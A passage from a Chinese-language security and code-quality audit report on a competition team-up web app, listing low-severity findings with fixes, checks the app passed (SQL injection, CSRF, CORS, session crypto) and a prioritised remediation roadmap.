| L12 | `deploy/docker-compose.yml:43-52` | api 服务未传 `WEB_ORIGIN`/`SESSION_TTL_HOURS`，CORS 白名单生产恒为 localhost:5173（同源反代下暂无碍，前端独立域名直连即全挂） | compose 补环境变量 |
| L13 | `MarkdownView.vue:6,13` | 全站唯一 v-html：markdown-it `html:false` + 默认 validateLink 当前安全（内容源为管理员公告），但无 DOMPurify 纵深防御，未来复用到 UGC 即成 XSS 点 | 加 DOMPurify + 注释锁定配置 |
| L14 | `corrections.service.ts:23-67`、`comments.service.ts` | 纠错无频率限制、无同字段去重，每条通知**全体管理员**（可被用作通知轰炸/骚扰）；评论 create 零限流 | 同用户同竞赛 PENDING 去重；通知按小时聚合；写接口限流 |
| L15 | `AppNav.vue:45` | 30s 轮询 interval 永不清理（组件与 app 同生命周期可容忍，HMR/复用场景叠加）；游客状态下也空转 | 存入变量 onUnmounted 清理；未登录不启动 |
| L16 | `CommentList.vue:60-76、100-107` | 回复无 submitting 锁，回车连击重复发布；删除评论**无确认弹窗**，误触即删 | 复用 guard；加 confirm |
| L17 | `TeamDetailView.vue:334`、`TeamNewView.vue:212`、`ProfileView.vue:157`、`AdminCompetitionEdit.vue:40-61` | 动态表单行 `:key="i"`（index 作 key + splice）；AdminCompetitionEdit 还把 GET 返回的多余字段（id/createdAt 等）一并回传 PUT | 行对象加 uid；显式挑字段回传 |
| L18 | `CompetitionListView.vue:16` | `route.query.levels` 为数组形式（`?levels=A&levels=B`）时 `.split` 直接 TypeError | `String(route.query.levels ?? '')` |
| L19 | `LoginView.vue:162-163` | `redirect` 查询参数未校验即 `router.push`（catch-all 兜底使风险很低） | 限定以 `/` 开头且非 `//` |
| L20 | `client.ts:27、51-63` | `qs()` 把 `bonusOnly=false` 也序列化为 `"false"` 传给后端（布尔字符串解析契约风险）；成功但非 JSON 的响应（如 204）被当作错误抛出；请求无超时 | 跳过 false；非 JSON 端点白名单；加 AbortSignal.timeout |
| L21 | `api/types.ts:20,37` | `CompetitionDetail extends CompetitionListItem` 声明的 `status/nextDeadline/recruitingTeams:number` 等字段 detail 接口实际不返回（detail 返回的 recruitingTeams 是数组，`recruitingTeamsList?` 后端从不存在）——类型谎言，潜伏地雷 | 按实际返回拆分类型 |
| L22 | `apps/web/package.json:20,33` | vite 5.4.11 之后修复过多个 dev-server 任意文件读取/绕过 CVE（仅影响开发环境）；markdown-it `^15` 版本号超出常见稳定线，需核对 lockfile 实际解析版本 | 升级 vite 至 5.4 最新补丁位；CI 加 `pnpm audit --prod` 门禁 |
| L23 | `schema.prisma` | `Comment.parentId`、`Report(reporterId,targetType,targetId)` 无索引；多态评论缺 `(targetType,targetId)` 复合索引（`docs/OPEN_QUESTIONS.md` Q7 自己提醒过必须加） | 补迁移加索引 |

---

## 五、正向确认（审计通过项）

- **无 SQL 注入**：唯一原生 SQL（`search.service.ts`）用 `$queryRaw` 模板参数化；全库无 `$queryRawUnsafe`（测试辅助中仅拼接硬编码常量）；排序字段均为白名单枚举映射，无 orderBy 透传
- **无实质 CSRF 缺口**：SameSite=Lax + 所有状态变更接口均为 POST/PATCH/PUT/DELETE，无 GET 改状态接口
- **凭据管理**：git 历史无真实 `.env`（仅 `.env.example` 模板，已实证）；compose 用 `${POSTGRES_PASSWORD:?}` 强制外部注入
- **密码学基础**：session token `crypto.randomBytes(24)`（192bit）；密码 scrypt + 16B 随机盐 + `timingSafeEqual`
- **权限模型 fail-safe**：全局 `APP_GUARD` 默认拒绝 + `@Public()` 显式放行；AdminController 类级 `@Admin()`；通知/收藏接口全部按 `userId` 作用域（`updateMany({where:{id, userId}})`），无 IDOR
- **错误处理**：`HttpExceptionFilter` 统一兜底文案（「服务器开小差了」），堆栈只进服务端日志不外泄
- **契约基本盘**：信封结构（`{code,data,message,dev}`）、分页结构（`items/total/page/pageSize`）、数组参数编解码（逗号分隔 ↔ `TransformStringArray`）、全部路由路径/方法两端一一核对一致；列表接口普遍 `$transaction([findMany, count])` 且 pageSize 有 `@Max` 上限（teams ≤60、notifications ≤60、admin ≤100）
- **CORS**：`WEB_ORIGIN` 白名单 + credentials，无 `origin:*` 与凭据并存的致命组合；cookie `teamup_sid` httpOnly + sameSite=lax + path=/，前端 `credentials:'include'` + vite 代理/nginx 同源反代配套正确（除 S2 的 Secure 问题）
- **shared 包**：前端经 vite alias 直引 TS 源码、后端引 dist，枚举值两端同源一致
- **登录即注册流程**：对已封禁用户有拦截；验证码 5 次失败作废、发信四级限流矩阵设计合理（仅实现有 S3/H2/H6 缺陷）

---

## 六、修复优先级路线图

| 优先级 | 项目 | 理由 |
|--------|------|------|
| **P0（立即，一行级修复）** | S1 删 `contact` 行 → 恢复构建；S3 换 `crypto.randomInt` → 堵账号接管；H7 修 `hasPassword` 路径 → 恢复改密功能 | 改动极小、收益极大 |
| **P1（上线前必须）** | S2 + S4（TLS/COOKIE_SECURE 解耦 + SMTP 实装 + 生产 fail-fast）；S5 adminDetail 转换；S6 seed 生产防护；H4 pg_trgm 迁移；H2 trust proxy；H3/H6 爆破防护与冷却静默 | 否则生产部署即瘫痪或带后门上线 |
| **P2（本迭代内）** | H1 半匿名裁剪（**需产品先拍板**，消除代码/注释/文档三方矛盾）；H5 改密吊销会话；M1 officialUrl XSS 三层防御；M2 用户建档改 DRAFT；M4 Redis 逐出策略；M5 并发竞态 | 数据安全与核心业务正确性 |
| **P3（排期修复）** | H8-H13 前端功能缺陷；M3 分页、M6 Cron 时区、M7-M19；L 级按表逐清 | 用户体验与健壮性 |
| **工程债** | 后端仅 1 个测试文件（且已过期必挂）、前端零测试：建议为 auth 流程、joinTeam 状态机、权限裁剪补集成测试，CI 加 `tsc --noEmit` + `pnpm audit --prod` 门禁 | S1 这类编译错误本应被 CI 拦截 |

---

*报告由 4 条独立审查线（前端逻辑 / 后端业务与数据库 / 接口契约 / 安全）并行全量读码生成，严重与高危发现均经主线交叉实证（含 `tsc --noEmit` 编译验证、schema 核对、git 历史检查）。*
